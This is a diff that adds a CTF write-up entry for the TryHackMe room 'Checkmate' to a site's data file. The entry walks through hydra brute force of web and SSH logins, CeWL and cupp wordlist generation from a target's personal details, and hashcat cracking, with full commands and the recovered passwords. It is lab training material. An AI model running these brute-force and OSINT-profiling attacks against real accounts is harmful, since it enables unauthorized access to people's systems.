@@ -593,6 +593,281 @@ root
       },
     ],
   },
+  {
+    slug: "checkmate",
+    name: "Checkmate",
+    platform: "TryHackMe",
+    difficulty: "Easy",
+    os: "Linux",
+    date: "2026-07-12",
+    tags: ["hydra", "cewl", "cupp", "hashcat", "http-brute-force"],
+    summary:
+      "A TryHackMe challenge that chains five escalating password attacks — hydra default-cred brute force, a CeWL site wordlist, a cupp OSINT profile, a cracked hashcat hash, and a rule-mangled wordlist to finally brute-force SSH.",
+    phases: [
+      {
+        title: "Recon",
+        body: `[Checkmate](https://tryhackme.com/room/checkmate) is a TryHackMe
+challenge framed as an internal security assessment of one employee, Marco
+Bianchi, across five levels of increasingly personal password attacks. The
+landing app on port 5000 briefs all five and is explicit that it's off
+limits itself:
+
+![Operation Checkmate landing page, framed as an internal password audit of Marco Bianchi, with Level 1 selected](/writeups/checkmate/recon-landing-brief.png)
+
+> Focus on the intended techniques and clues provided throughout the room.
+> Blind brute-forcing against this main application on port 5000 is out of
+> scope and may trigger a temporary cooldown.
+
+Clicking through the other tabs names the real targets: \`firewall.thm:5001\`
+(Level 1), \`jobs.thm:5002\` (Level 2), and \`social.thm:5003\` (Levels 3 and
+4, plus the SSH service behind it for Level 5). All three resolve to the
+same host, so they go straight into \`/etc/hosts\`:
+
+\`\`\`shell
+$ echo "10.49.189.54 firewall.thm jobs.thm social.thm" | sudo tee -a /etc/hosts
+\`\`\`
+
+Each level is gated behind the one before it, so the plan is to work
+through them in order.`,
+      },
+      {
+        title: "Level 1 — Firewall",
+        body: `\`firewall.thm:5001\` is a FirewallOS management console. The brief says
+Marco "kept default credentials," and the login form obligingly pre-fills
+\`admin\` as the username:
+
+![FirewallOS sign-in page with the admin username pre-filled and a masked password field](/writeups/checkmate/level1-login-portal.png)
+
+Default/default doesn't work, so the actual password still needs
+brute-forcing. Intercepting a login attempt in Burp confirms the exact
+endpoint and parameter names to target:
+
+![Burp Suite intercepting a POST /login request with username=admin&password=admin](/writeups/checkmate/level1-burp-login-request.png)
+
+\`\`\`text
+POST /login HTTP/1.1
+Host: firewall.thm:5001
+...
+username=admin&password=admin
+\`\`\`
+
+That's everything \`hydra\`'s \`http-post-form\` module needs:
+
+\`\`\`shell
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt firewall.thm http-post-form -s 5001 "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
+[5001][http-post-form] host: firewall.thm   login: admin   password: 12345
+1 of 1 target successfully completed, 1 valid password found
+\`\`\`
+
+![hydra cracking the FirewallOS login as admin:12345](/writeups/checkmate/level1-hydra-crack.png)
+
+\`admin\` / \`12345\` logs straight into the dashboard &mdash; Level 1's password
+is \`12345\`.
+
+![FirewallOS dashboard after logging in as admin, showing firewall policies and a "Secure internal employee portal next" reminder](/writeups/checkmate/level1-dashboard-success.png)`,
+      },
+      {
+        title: "Level 2 — Jobs",
+        body: `The dashboard's own reminder points at the next target: \`jobs.thm:5002\`,
+an "Engineering Careers" site with an Employee Login panel tucked behind
+it.
+
+![Engineering Careers homepage on jobs.thm, listing featured roles and company keyword tags like innovation, excellence, and security](/writeups/checkmate/level2-careers-homepage.png)
+
+![Employee Login form with the username pre-filled as marco and a masked password field](/writeups/checkmate/level2-employee-login.png)
+
+The username this time is \`marco\`, not \`admin\` &mdash; worth noting after
+wasting a few attempts assuming otherwise. The Level 2 brief says Marco
+"used common company keywords as passwords," which means \`rockyou.txt\`
+is the wrong wordlist entirely; the real one has to come from the site
+itself. \`cewl\` scrapes it directly:
+
+\`\`\`shell
+$ cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emailfile -w wordsfile http://jobs.thm:5002
+$ wc -l wordsfile
+98 wordsfile
+\`\`\`
+
+![CeWL crawling jobs.thm two links deep and saving 98 words to a wordlist](/writeups/checkmate/level2-cewl-wordlist-gen.png)
+
+\`\`\`text
+security
+excellence
+careers
+apply
+full
+time
+cloud
+engineering
+digital
+innovation
+\`\`\`
+
+![First lines of the CeWL-generated wordlist: security, excellence, careers, apply, and more](/writeups/checkmate/level2-cewl-wordlist-sample.png)
+
+\`\`\`shell
+$ hydra -l marco -P wordsfile jobs.thm http-post-form -s 5002 "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
+[5002][http-post-form] host: jobs.thm   login: marco   password: excellence
+1 of 1 target successfully completed, 1 valid password found
+\`\`\`
+
+![hydra cracking the Employee Login as marco:excellence using the CeWL wordlist](/writeups/checkmate/level2-hydra-crack.png)
+
+Level 2's password is \`excellence\`. Logging in as marco reaches an Employee
+Profile page &mdash; full name Marco Bianchi, nickname \`marky\`, birthdate
+\`14021995\` &mdash; personal details that turn out to matter for the next
+level.
+
+![Employee Profile page for Marco Bianchi showing his nickname "marky" and birthdate 14021995](/writeups/checkmate/level2-employee-profile.png)`,
+      },
+      {
+        title: "Level 3 — Social",
+        body: `\`social.thm:5003\` is a social-network clone, and its login page drops a
+direct hint about where the next password comes from:
+
+![social.thm login page with the hint "Use the details from jobs.thm to generate Marco's password"](/writeups/checkmate/level3-social-login.png)
+
+That's an OSINT-style profiling attack, and [cupp](https://github.com/Mebus/cupp)
+is built exactly for turning a target's personal details into a
+candidate wordlist:
+
+\`\`\`shell
+$ git clone https://github.com/Mebus/cupp.git
+$ cd cupp
+$ ./cupp.py -i
+\`\`\`
+
+![Cloning cupp from GitHub and starting it in interactive profiling mode](/writeups/checkmate/level3-cupp-clone.png)
+
+Feeding it Marco's details from the employee profile &mdash; first name,
+surname, nickname, and birthdate &mdash; plus the company keywords CeWL
+already scraped in Level 2 as extra seed words:
+
+\`\`\`text
+> First Name: Marco
+> Surname: Bianchi
+> Nickname: marky
+> Birthdate (DDMMYYYY): 14021995
+...
+> Do you want to add some key words about the victim? Y/[N]: y
+> Please enter the words, separated by comma: security,excellence,innovation,digital,cloud
+\`\`\`
+
+![cupp's interactive prompts asking for Marco's name, nickname, and birthdate](/writeups/checkmate/level3-cupp-interactive-start.png)
+
+\`\`\`text
+[+] Saving dictionary to marco.txt, counting 4468 words.
+\`\`\`
+
+![cupp finishing and saving a 4,468-word dictionary to marco.txt](/writeups/checkmate/level3-cupp-wordlist-generated.png)
+
+\`\`\`shell
+$ hydra -l marco -P marco.txt social.thm http-post-form -s 5003 "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
+[5003][http-post-form] host: social.thm   login: marco   password: Bianchi2495
+1 of 1 target successfully completed, 1 valid password found
+\`\`\`
+
+![hydra cracking the social.thm login as marco:Bianchi2495 using the cupp-generated wordlist](/writeups/checkmate/level3-hydra-crack.png)
+
+Level 3's password is \`Bianchi2495\` &mdash; his surname plus his birthdate's
+day and year digits, exactly the kind of pattern cupp is designed to
+guess. Logged in as marco, his own feed turns out to hold the key to
+Level 5: a post spelling out his password formula in plain text.
+
+![Marco's social.thm feed, including a post explaining his password formula: capitalize a company keyword, append a number, add an exclamation mark](/writeups/checkmate/level3-social-feed-loggedin.png)`,
+      },
+      {
+        title: "Level 4 — Hash cracking",
+        body: `Still on \`social.thm:5003\`, Level 4 is a file-recovery puzzle rather than
+a login form. Marco recently uploaded a new profile picture, and the
+platform stores uploads as \`sha256(original_filename).png\` &mdash; the task
+is to recover that original filename from the hash alone.
+
+![Level 4 brief: the platform renames uploads to their SHA256 hash, and the task is to recover the original filename](/writeups/checkmate/level4-brief.png)
+
+The uploaded picture itself is reachable directly, and its filename in the
+URL bar is the hash to crack:
+
+\`\`\`text
+http://social.thm:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
+\`\`\`
+
+![The uploaded profile picture, served at a URL whose filename is a SHA256 hash](/writeups/checkmate/level4-profile-picture-hash.png)
+
+\`hashid\` confirms it's a plain SHA-256:
+
+\`\`\`shell
+$ echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash
+$ hashid -m -j hash
+[+] SHA-256 [Hashcat Mode: 1400][JtR Format: raw-sha256]
+\`\`\`
+
+![hashid identifying the hash as SHA-256, Hashcat mode 1400](/writeups/checkmate/level4-hashid-identify.png)
+
+\`\`\`shell
+$ hashcat -m 1400 -a 0 hash /usr/share/wordlists/rockyou.txt
+d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:family
+\`\`\`
+
+![hashcat cracking the SHA256 hash to recover the original filename "family"](/writeups/checkmate/level4-hashcat-result.png)
+
+The original filename &mdash; and Level 4's password &mdash; is \`family\`.`,
+      },
+      {
+        title: "Level 5 — Password rule & SSH",
+        body: `Level 5 doesn't need a new vulnerability, just the password formula Marco
+already leaked on his own feed back in Level 3:
+
+![Marco's post: "My tip for strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark"](/writeups/checkmate/level5-password-rule-post.png)
+
+That rule, combined with the company-keyword wordlist CeWL already
+scraped in Level 2, is enough to build a targeted wordlist by hand. First,
+capitalize the first letter of every word:
+
+\`\`\`shell
+$ sed -i 's/./\\U&/' wordsfile.txt
+\`\`\`
+
+Or the same thing in Python, for anyone who'd rather not fight \`sed\`'s
+case-conversion syntax:
+
+\`\`\`python
+with open("wordsfile.txt") as f:
+    lines = f.readlines()
+with open("wordsfile.txt", "w") as f:
+    for line in lines:
+        f.write(line[:1].upper() + line[1:])
+\`\`\`
+
+![Wordlist words capitalized: Security, Excellence, Careers, Apply, and more](/writeups/checkmate/level5-wordlist-capitalized.png)
+
+Then a small loop appends every 4-digit number in a plausible range plus
+a trailing \`!\` to each capitalized word:
+
+\`\`\`shell
+$ for i in $(cat wordsfile.txt); do
+    for j in $(seq 2000 2100); do
+        echo "\${i}\${j}!";
+    done
+done > rulewords.txt
+\`\`\`
+
+![Running the wordlist-mangling script to build rulewords.txt](/writeups/checkmate/level5-rule-script-run.png)
+
+\`\`\`shell
+$ hydra -l marco -P rulewords.txt social.thm ssh
+[22][ssh] host: social.thm   login: marco   password: Security2024!
+1 of 1 target successfully completed, 1 valid password found
+\`\`\`
+
+![hydra brute-forcing SSH and cracking marco's password as Security2024!](/writeups/checkmate/level5-hydra-ssh-crack.png)
+
+\`Security2024!\` &mdash; exactly the rule Marco described, applied to one of
+his own company's keywords &mdash; gets SSH access as marco and closes out
+all five levels.`,
+      },
+    ],
+  },
 ];
 
 export function getMachine(slug: string): Machine | undefined {
